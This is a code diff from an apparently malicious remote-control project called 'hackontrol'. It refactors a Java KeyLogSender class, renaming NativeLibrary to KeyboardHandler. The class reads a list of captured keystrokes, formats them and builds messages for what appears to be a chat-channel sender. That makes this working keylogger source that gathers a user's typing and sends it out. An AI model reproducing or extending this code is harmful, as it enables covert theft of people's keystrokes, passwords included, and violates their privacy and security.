@@ -7,8 +7,8 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
 import com.khopan.hackontrol.Hackontrol;
-import com.khopan.hackontrol.NativeLibrary;
-import com.khopan.hackontrol.NativeLibrary.KeyEntry;
+import com.khopan.hackontrol.handler.KeyboardHandler;
+import com.khopan.hackontrol.handler.KeyboardHandler.KeyEntry;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;
 
@@ -23,17 +23,17 @@ public class KeyLogSender {
 	}
 
 	private void tick() {
-		if(!NativeLibrary.Enable) {
-			NativeLibrary.KEYSTROKE_LIST.clear();
+		if(!KeyboardHandler.Enable) {
+			KeyboardHandler.KEYSTROKE_LIST.clear();
 			return;
 		}
 
-		if(NativeLibrary.KEYSTROKE_LIST.isEmpty()) {
+		if(KeyboardHandler.KEYSTROKE_LIST.isEmpty()) {
 			return;
 		}
 
 		try {
-			int size = NativeLibrary.KEYSTROKE_LIST.size();
+			int size = KeyboardHandler.KEYSTROKE_LIST.size();
 			Hackontrol.LOGGER.info("Key stroke: {}", size);
 			List<String> messageList = new ArrayList<>();
 			StringBuilder builder = new StringBuilder();
@@ -45,7 +45,7 @@ public class KeyLogSender {
 			String suffix = KeyLoggerModule.RawKeyMode ? "" : "\n```";
 
 			for(int i = 0; i < size; i++) {
-				KeyEntry entry = NativeLibrary.KEYSTROKE_LIST.get(i);
+				KeyEntry entry = KeyboardHandler.KEYSTROKE_LIST.get(i);
 				String entryText;
 
 				if(KeyLoggerModule.RawKeyMode) {
@@ -79,7 +79,7 @@ public class KeyLogSender {
 				builder.append(entryText);
 			}
 
-			NativeLibrary.KEYSTROKE_LIST.clear();
+			KeyboardHandler.KEYSTROKE_LIST.clear();
 
 			if(!builder.isEmpty()) {
 				messageList.add(builder.toString());
